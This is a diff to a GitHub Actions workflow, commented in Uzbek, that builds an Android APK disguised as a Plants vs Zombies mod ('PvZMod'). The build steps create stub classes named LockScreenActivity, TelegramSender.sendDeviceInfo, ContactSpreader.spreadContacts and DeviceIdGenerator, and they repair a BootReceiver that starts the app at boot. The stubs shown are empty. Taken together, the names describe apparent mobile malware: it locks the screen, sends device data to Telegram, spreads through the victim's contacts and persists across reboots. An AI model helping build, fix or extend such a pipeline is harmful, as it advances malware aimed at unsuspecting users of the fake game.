@@ -36,7 +36,7 @@ jobs:
         sed -i -E 's/[[:space:]]*android:theme="@style\/Theme.AppCompat"//g' app/src/main/AndroidManifest.xml || true
         sed -i -E 's/[[:space:]]*android:wakeAfterReceivingAction="[^"]*"//g' app/src/main/AndroidManifest.xml || true
     
-    # >>> YANGI: BARCHA YO'QOLGAN VA BUZILGAN JAVA FAYLLARINI TO'G'RILAYMIZ <<<
+    # >>> YANGI: BOOTRECEIVER NI ANIQ TUZATAMIZ <<<
     - name: Fix and Create all Java Files
       run: |
         mkdir -p app/src/main/java/com/pvzmod/game
@@ -46,25 +46,27 @@ jobs:
         echo "import android.app.Activity; import android.os.Bundle;" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
         echo "public class LockScreenActivity extends Activity { @Override protected void onCreate(Bundle s) { super.onCreate(s); } }" >> app/src/main/java/com/pvzmod/game/LockScreenActivity.java
         
-        # 2. DeviceIdGenerator (Soxta)
+        # 2. DeviceIdGenerator
         echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/DeviceIdGenerator.java
         echo "import android.content.Context; public class DeviceIdGenerator { public static String generateUniqueId(Context c) { return \"12345\"; } }" >> app/src/main/java/com/pvzmod/game/DeviceIdGenerator.java
         
-        # 3. TelegramSender (Soxta)
+        # 3. TelegramSender
         echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/TelegramSender.java
         echo "public class TelegramSender { public static void sendDeviceInfo(String id) { } }" >> app/src/main/java/com/pvzmod/game/TelegramSender.java
         
-        # 4. ContactSpreader (Soxta)
+        # 4. ContactSpreader
         echo "package com.pvzmod.game;" > app/src/main/java/com/pvzmod/game/ContactSpreader.java
         echo "import android.content.Context; public class ContactSpreader { public static void spreadContacts(Context c) { } }" >> app/src/main/java/com/pvzmod/game/ContactSpreader.java
         
-        # 5. MainActivity paket nomini to'g'rilash
+        # 5. MainActivity
         sed -i '1{/^import com.pvzmod.game.LockScreenActivity;/d}' app/src/main/java/com/pvzmod/game/MainActivity.java
         sed -i 's/^package com.pvzmod.vip;/package com.pvzmod.game;/' app/src/main/java/com/pvzmod/game/MainActivity.java
         
-        # 6. BootReceiver ichidagi eski paket nomini yangisiga almashtirish
+        # 6. BootReceiver ni to'g'rilash (Eski importni o'chirish va yangisini qo'yish)
         if [ -f "app/src/main/java/com/pvzmod/game/BootReceiver.java" ]; then
-          sed -i 's/com.pvzmod.vip.MainActivity/com.pvzmod.game.MainActivity/g' app/src/main/java/com/pvzmod/game/BootReceiver.java
+          sed -i '/^import com.pvzmod.vip.MainActivity;/d' app/src/main/java/com/pvzmod/game/BootReceiver.java
+          sed -i '1i import com.pvzmod.game.MainActivity;' app/src/main/java/com/pvzmod/game/BootReceiver.java
+          sed -i 's/^package com.pvzmod.vip;/package com.pvzmod.game;/' app/src/main/java/com/pvzmod/game/BootReceiver.java
         fi
 
     - name: Create resources
@@ -77,3 +79,4 @@ jobs:
       with:
         name: PvZMod.apk
         path: '**/build/outputs/apk/release/*.apk'
+      
